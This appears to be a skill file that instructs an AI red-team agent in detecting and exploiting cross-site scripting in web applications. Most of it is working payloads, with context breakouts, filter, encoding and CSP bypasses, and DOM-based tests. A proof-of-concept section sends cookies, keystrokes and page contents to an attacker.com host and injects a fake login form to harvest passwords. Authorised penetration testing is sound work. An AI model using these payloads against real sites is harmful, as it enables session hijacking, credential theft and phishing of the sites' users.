---
name: xss-testing
description: Detect and exploit cross-site scripting vulnerabilities in web applications
origin: RedteamOpencode
---

# XSS Testing

## When to Activate

- User input is reflected in HTTP responses (search, error messages, profile fields)
- DOM manipulation based on URL fragments, query parameters, or `postMessage`
- Rich text editors, comment systems, or any stored user content
- Input appears in HTML attributes, JavaScript blocks, or CSS

## Types

| Type | Description | Persistence |
|------|-------------|-------------|
| Reflected | Input in request reflected in response | None — requires victim to click link |
| Stored | Input saved and displayed to other users | Persistent — triggers on page view |
| DOM-based | Client-side JS processes input unsafely | Depends on source (URL, storage) |

## Detection

### 1. Basic Probe

Inject a unique string first to find reflection points without triggering filters.

```
# Canary — track where it appears in response
xss<test>"'`;(){}
RedteamProbe12345

# Simple alert tests
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### 2. Find All Reflection Points

For each parameter:
1. Submit a unique canary string
2. Search the entire response (HTML source, not rendered) for the canary
3. Note every location where it appears
4. Determine the context for each reflection

### 3. Context Analysis

Identify WHERE the input lands to choose the right payload.

| Context | Example | Breakout Strategy |
|---------|---------|-------------------|
| HTML body | `<p>INPUT</p>` | Inject tags directly |
| HTML attribute | `<input value="INPUT">` | Close attribute, add event handler |
| JavaScript string | `var x = "INPUT";` | Close string, inject code |
| JavaScript template | `` `Hello ${INPUT}` `` | `${alert(1)}` |
| URL/href | `<a href="INPUT">` | `javascript:alert(1)` |
| CSS | `style="color:INPUT"` | `red; background:url(javascript:...)` |
| HTML comment | `<!-- INPUT -->` | `--><script>alert(1)</script>` |

## Context-Specific Payloads

### HTML Body Context

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg/onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<body onload=alert(document.domain)>
<marquee onstart=alert(document.domain)>
```

### Attribute Context

```html
# Breaking out of attribute value
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
' onfocus='alert(1)' autofocus='

# Breaking out of tag entirely
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>

# Inside event handler attribute
alert(1)//
';alert(1)//
```

### JavaScript Context

```javascript
# Inside a quoted string
";alert(1)//
';alert(1)//
\';alert(1)//

# Inside a JS expression
-alert(1)-
1;alert(1)//

# Template literal
${alert(document.domain)}
```

### URL/href Context

```html
javascript:alert(document.domain)
data:text/html,<script>alert(1)</script>
```

## Filter Bypass Techniques

### Tag/Keyword Blocked

```html
# Case variation
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>

# Tag alternatives (if <script> blocked)
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>

# Null bytes / whitespace tricks
<scr%00ipt>alert(1)</script>
<script\x20>alert(1)</script>
```

### Encoding Bypasses

```
# HTML entity encoding
&lt;script&gt;  ->  decode in attribute contexts
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;

# URL encoding (for URL contexts)
%3Cscript%3Ealert(1)%3C%2Fscript%3E

# Double URL encoding
%253Cscript%253Ealert(1)%253C%252Fscript%253E

# Unicode escapes (JS context)
\u0061lert(1)
eval('\x61lert(1)')
```

### Keyword Bypass

```html
# alert() blocked
confirm(1)
prompt(1)
eval('al'+'ert(1)')
setTimeout('alert(1)',0)
Function('alert(1)')()
window['alert'](1)
self['ale'+'rt'](document.domain)
[].constructor.constructor('alert(1)')()

# Parentheses blocked
alert`1`
onerror=alert;throw 1
```

### CSP Bypass Indicators

```
# Check CSP header
# Look for: unsafe-inline, unsafe-eval, wildcard sources, JSONP endpoints, CDN with user content

# If unsafe-eval allowed
<script>eval('alert(1)')</script>

# If script-src includes a JSONP endpoint
<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>

# If base-uri not restricted
<base href="https://attacker.com/">
```

## DOM-Based XSS

### Common Sources and Sinks

```
# Sources (attacker-controlled input)
document.location / document.URL / document.referrer
location.hash / location.search
window.name
postMessage data
document.cookie
localStorage / sessionStorage

# Sinks (dangerous functions)
innerHTML / outerHTML
document.write / document.writeln
eval / setTimeout / setInterval / Function
element.src / element.href
jQuery.html() / jQuery.append() / $()
```

### Testing DOM XSS

```
# URL fragment (not sent to server)
https://target.com/page#<img src=x onerror=alert(1)>

# Check for document.write with URL input
https://target.com/page?q=<script>alert(1)</script>

# PostMessage testing (in browser console)
targetWindow.postMessage('<img src=x onerror=alert(1)>','*')
```

## Proof of Concept

Demonstrate real impact rather than just `alert(1)`.

```javascript
// Show domain (proves execution context)
alert(document.domain)

// Cookie theft (if no HttpOnly)
fetch('https://attacker.com/log?c='+document.cookie)

// Session hijacking
new Image().src='https://attacker.com/steal?cookie='+document.cookie

// Keylogging
document.onkeypress=function(e){fetch('https://attacker.com/log?k='+e.key)}

// DOM content extraction
fetch('https://attacker.com/log?html='+btoa(document.body.innerHTML))

// Phishing — inject fake login form
document.body.innerHTML='<h1>Session expired</h1><form action="https://attacker.com/phish"><input name="user"><input name="pass" type="password"><button>Login</button></form>'
```

## Stored XSS Checklist

1. Identify all input fields that persist data (profiles, comments, messages, file names)
2. Submit XSS payloads in each field
3. Navigate to every page where the stored data is displayed
4. Check if payload executes in other user contexts
5. Test file upload names: `"><img src=x onerror=alert(1)>.jpg`
6. Test metadata fields: EXIF data, document properties

## What to Record

- **Injection point:** parameter name, input field, HTTP method
- **Reflection context:** HTML body, attribute, JS string, DOM sink
- **XSS type:** reflected, stored, DOM-based
- **Working payload:** exact payload that achieved execution
- **Filter bypasses:** what was blocked and how it was circumvented
- **CSP status:** present/absent, relevant directives, bypasses found
- **Impact demonstration:** cookie access, session hijacking potential, stored vs self-only
- **Affected users:** who sees the stored payload (all users, specific roles, self-only)
